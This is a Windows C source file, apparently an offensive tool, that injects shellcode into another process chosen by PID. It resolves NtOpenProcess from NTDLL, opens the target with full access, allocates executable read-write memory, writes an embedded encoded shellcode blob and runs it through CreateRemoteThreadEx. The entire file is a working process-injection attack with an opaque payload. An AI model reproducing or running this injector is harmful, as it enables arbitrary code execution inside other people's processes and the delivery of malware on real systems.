/* INCLUDES */
#include "nt_process.h"

/* GET MODULE HANDLE */
HMODULE GetMod(IN LPCWSTR modName) {
	HMODULE hModule = NULL;
	// trying to get handle
	info("trying to get a handle to %S", modName);
	hModule = GetModuleHandleW(modName);
	// failed to get handle
	if (hModule == NULL) {
		warn("failed to get a handle to the module, error: 0x%lx\n", GetLastError());
		return NULL;
	}
	// got handle
	okay("got a handle to the module!");
	info("\\___[ %ls\n\t\\_0x%p]\n", modName, hModule);
	return hModule;
}

/* MAIN */
int main(int argc, char* argv[]) {
	/* INIT/DECLARE */
	DWORD dwTID;
	DWORD PID = 0;
	LPVOID rBuffer = NULL;
	NTSTATUS STATUS = 3;
	HMODULE hNTDLL = NULL;
	HANDLE hThread = NULL;
	HANDLE hProcess = NULL;

	/* SHELLCODE */
	CONST UCHAR shellPuke[] = {"\x54\x5a\x66\x81\xe2\x70\xfb\xdb\xc5\x4d\x31\xc9\x48\x0f"
	"\xae\x02\x41\xb1\x23\x48\xb8\xc7\x5d\x46\x35\x33\x11\xb7"
	"\xef\x48\x83\xc2\x08\x4c\x8b\x12\x49\xff\xc9\x4b\x31\x44"
	"\xca\x2a\x4d\x85\xc9\x75\xf3\x3b\x15\xc5\xd1\xc3\xf9\x77"
	"\xef\xc7\x5d\x07\x64\x72\x41\xe5\xbe\x91\x15\x77\xe7\x56"
	"\x59\x3c\xbd\xa7\x15\xcd\x67\x2b\x59\x3c\xbd\xe7\x15\xcd"
	"\x47\x63\x59\xb8\x58\x8d\x17\x0b\x04\xfa\x59\x86\x2f\x6b"
	"\x61\x27\x49\x31\x3d\x97\xae\x06\x94\x4b\x74\x32\xd0\x55"
	"\x02\x95\x1c\x17\x7d\xb8\x43\x97\x64\x85\x61\x0e\x34\xe3"
	"\x9a\x37\x67\xc7\x5d\x46\x7d\xb6\xd1\xc3\x88\x8f\x5c\x96"
	"\x65\xb8\x59\xaf\xab\x4c\x1d\x66\x7c\x32\xc1\x54\xb9\x8f"
	"\xa2\x8f\x74\xb8\x25\x3f\xa7\xc6\x8b\x0b\x04\xfa\x59\x86"
	"\x2f\x6b\x1c\x87\xfc\x3e\x50\xb6\x2e\xff\xbd\x33\xc4\x7f"
	"\x12\xfb\xcb\xcf\x18\x7f\xe4\x46\xc9\xef\xab\x4c\x1d\x62"
	"\x7c\x32\xc1\xd1\xae\x4c\x51\x0e\x71\xb8\x51\xab\xa6\xc6"
	"\x8d\x07\xbe\x37\x99\xff\xee\x17\x1c\x1e\x74\x6b\x4f\xee"
	"\xb5\x86\x05\x07\x6c\x72\x4b\xff\x6c\x2b\x7d\x07\x67\xcc"
	"\xf1\xef\xae\x9e\x07\x0e\xbe\x21\xf8\xe0\x10\x38\xa2\x1b"
	"\x7d\x89\x10\xb7\xef\xc7\x5d\x46\x35\x33\x59\x3a\x62\xc6"
	"\x5c\x46\x35\x72\xab\x86\x64\xa8\xda\xb9\xe0\x88\xe1\x02"
	"\x4d\x91\x1c\xfc\x93\xa6\xac\x2a\x10\x12\x15\xc5\xf1\x1b"
	"\x2d\xb1\x93\xcd\xdd\xbd\xd5\x46\x14\x0c\xa8\xd4\x2f\x29"
	"\x5f\x33\x48\xf6\x66\x1d\xa2\x93\x56\x52\x7d\xd4\xc1\xa2"
	"\x25\x23\x35\x0c\xa5\x01\x79"};

	// shellcode size
	SIZE_T szPuke = sizeof(shellPuke);

	/* CHECK ARGS */
	if (argc < 2) {
		warn("usage: %s <PID>", argv[0]);
		return EXIT_FAILURE;
	}
	
	// grab module handle && target proccess ID
	PID = atoi(argv[1]);
	hNTDLL = GetMod(L"NTDLL");

	// init OA && CID
	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };
	CLIENT_ID CID = { (HANDLE)PID, NULL };

	// info begin dll function addresses
	info("populating function prototypes...");

	/* INIT NtOpenProcess */
	NtOpenProcess openProcess = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
	if(openProcess == NULL) {
		warn("[NtOpenProcess] failed to get NTDLL function address for NtOpenProcess");
		return EXIT_FAILURE;
	}

	/* INIT NtClose */
	NtClose close = (NtClose)GetProcAddress(hNTDLL, "NtClose");
	if(close == NULL) {
		warn("[NtClose] failed to get NTDLL function address for NtClose");
		return EXIT_FAILURE;
	}

	// got dll function addresses
	okay("finished, beginning injection!");

	/* GET PROCESS HANDLE */
	STATUS = openProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
	if (STATUS != STATUS_SUCCESS) {
		warn("[NtOpenProcess] failed to get a handle on the process, error: 0x%lx", STATUS);
		return EXIT_FAILURE;
	}
	okay("got a handle on the process! (%ld)", PID);
	info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);

	/* ALLOCATE VIRTUAL MEMORY */
	info("allocating [RWX] buffer in process memory...");
	rBuffer = VirtualAllocEx(hProcess, NULL, szPuke, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (rBuffer == NULL) {
		warn("[VirtualAllocEx] failed, error: 0x%lx", GetLastError());
		goto CLEANUP;
	}
	okay("allocated [RWX] buffer in process memory at 0x%p", rBuffer);

	/* WRITE TO MEMORY */
	info("writing to allocated buffer...");
	WriteProcessMemory(hProcess, rBuffer, shellPuke, szPuke, 0);

	/* CREATE && EXECUTE THREAD */
	hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &dwTID);
	if (hThread == NULL) {
		warn("[CreateRemoteThreadEx] failed to get a handle on the thread, error %ld", GetLastError());
		goto CLEANUP;
	}
	okay("thread created, started routine! waiting fo thread to finish execution...");

	/* WAIT FOR THREAD COMPLETION */
	WaitForSingleObject(hThread, INFINITE);
	okay("thread finished execution! beginning cleanup...");

/* CLEANUP */
CLEANUP:

	/* CLOSE HANDLES */
	if (hThread) {
		close(hThread);
		info("closed handle on thread");
	}
	if (hProcess) {
		close(hProcess);
		info("closed handle on process");
	}

	/* EXIT */
	okay("finished with cleanup, thanks ;)");
	return EXIT_SUCCESS;
}